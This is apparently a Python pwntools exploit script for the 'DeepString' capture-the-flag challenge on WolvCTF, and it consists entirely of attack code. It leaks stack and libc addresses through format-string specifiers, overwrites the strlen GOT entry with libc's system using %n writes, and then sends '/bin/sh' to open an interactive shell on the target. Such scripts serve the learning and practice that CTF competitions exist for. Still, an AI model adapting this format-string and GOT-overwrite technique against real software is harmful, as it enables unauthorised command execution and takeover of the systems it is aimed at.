#!/usr/bin/python3

from pwn import *

exe = ELF('DeepString_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x4014ED 

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('deepstring.wolvctf.io', 1337)
else:
        p = process(exe.path)

GDB()
sla(b'reverse\n\n', b'-8')
payload = b'%7$p|%59$p|\0'.ljust(240) + p64(exe.sym.reflect)
sla(b'STRING: \n', payload)
stack = int(p.recvuntil(b'|', drop=True), 16)
libc.address = int(p.recvuntil(b'|', drop=True), 16) -0x2724a
info("stack " + hex(stack))
info("libc " + hex(libc.address))
input()
sla(b'reverse\n\n', b'-8')
system = libc.sym.system
part1 = system & 0xffffff
part2 = system >> 24 & 0xffffff
payload = f'%{part1}c%{20}$n'.encode()
payload += f'%{part2-part1}c%{21}$n'.encode()
# payload = b'%21$p\0'
payload = payload.ljust(0x30, b'a')
payload += flat(exe.got.strlen, exe.got.strlen+3)
payload = payload.ljust(240) + p64(exe.sym.reflect)
sla(b'STRING: \n', payload)
sla(b'reverse\n\n', b'0')
sla(b'STRING: \n', b'/bin/sh\0')

p.interactive()
